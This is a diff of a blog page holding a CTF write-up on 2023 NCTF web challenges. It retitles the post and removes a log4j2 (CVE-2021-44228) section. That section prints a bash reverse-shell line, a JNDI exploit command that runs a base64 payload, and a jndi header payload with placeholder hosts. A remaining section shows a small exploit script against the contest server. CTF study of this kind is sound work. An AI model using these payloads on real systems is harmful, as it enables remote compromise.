@@ -18,7 +18,7 @@
   
     <meta name="description" content="芜湖，爆零了 :)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2023_NCTF_Web题目复现">
+<meta property="og:title" content="2023_NCTF_Web部分题目复现">
 <meta property="og:url" content="http://example.com/2023/12/31/2023NCTF_web%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="RenDongjun&#39;s Blog">
 <meta property="og:description" content="芜湖，爆零了 :)">
@@ -32,7 +32,7 @@
 <meta property="og:image" content="http://example.com/img/ezwordpress2.png">
 <meta property="og:image" content="http://example.com/img/ezwordpress3.png">
 <meta property="article:published_time" content="2023-12-31T15:08:50.000Z">
-<meta property="article:modified_time" content="2023-12-31T02:03:44.363Z">
+<meta property="article:modified_time" content="2024-02-14T06:49:43.693Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -40,7 +40,7 @@
   
   
   
-  <title>2023_NCTF_Web题目复现 - RenDongjun&#39;s Blog</title>
+  <title>2023_NCTF_Web部分题目复现 - RenDongjun&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -182,7 +182,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2023_NCTF_Web题目复现"></span>
+            <span id="subtitle" data-typed-text="2023_NCTF_Web部分题目复现"></span>
           
         </div>
 
@@ -216,7 +216,7 @@
         
         
         
-          183 分钟
+          180 分钟
         
       </span>
     
@@ -253,7 +253,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">2023_NCTF_Web题目复现</h1>
+            <h1 id="seo-header">2023_NCTF_Web部分题目复现</h1>
             
             
               <div class="markdown-body">
@@ -357,20 +357,9 @@
 <p><code>exp</code>:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>remote_addr=<span class="hljs-string">&quot;http://117.50.175.234:9001&quot;</span><br><br>rs = requests.Session()<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/register&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/ban_user&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;ban_username&quot;</span>:&#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>&#125;&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br><br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br>resp = rs.post(remote_addr+<span class="hljs-string">&quot;/api/flag&quot;</span>,json=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure>
 
-<h3 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h3><blockquote>
-<p> Hint 1: 可以换个角度 尝试如何让 Spring 控制台报错? </p>
-<p> Hint 2: 确实是 log4j2 rce (CVE-2021-44228) </p>
-<p> Hint 3: fuzz (尝试将 payload 放入某个 HTTP Header)</p>
-</blockquote>
-<p><code>log4j2</code>，参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/462419319">log4j2</a>。</p>
-<p>反弹<code>shell</code>用<code>base64</code>编码。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/xxxx/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
-<p>然后创建恶意ldap服务</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64后的命令&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A xxxx<br></code></pre></td></tr></table></figure>
 
-<p><code>nc</code>监听，报文的<code>Accept</code>字段下添加<code>$&#123;jndi:rmi://xxxx:1099/yyyy&#125;</code>，发送。</p>
-<h3 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h3><blockquote>
+<h3 id="ez-wordpress-未做完"><a href="#ez-wordpress-未做完" class="headerlink" title="ez_wordpress[未做完]"></a>ez_wordpress[未做完]</h3><blockquote>
 <p>Hint 1: 可以思考下如何对 WordPress 进行信息收集 </p>
 <p> Hint 2: 注意版本 (6.4.1) 注意一些第三方的东西 </p>
 <p> Hint 3:  结合信息收集和网上已有的东西就可以自己本地搭建一个类似的环境进行测试 涉及的代码审计部分其实很少 </p>
@@ -411,7 +400,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2023_NCTF_Web题目复现</div>
+      <div>2023_NCTF_Web部分题目复现</div>
       <div>http://example.com/2023/12/31/2023NCTF_web题目复现/</div>
     </div>
     <div class="license-meta">
@@ -455,6 +444,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/01/28/ezHTTP/" title="BuuCTF做题记录_10">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BuuCTF做题记录_10</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
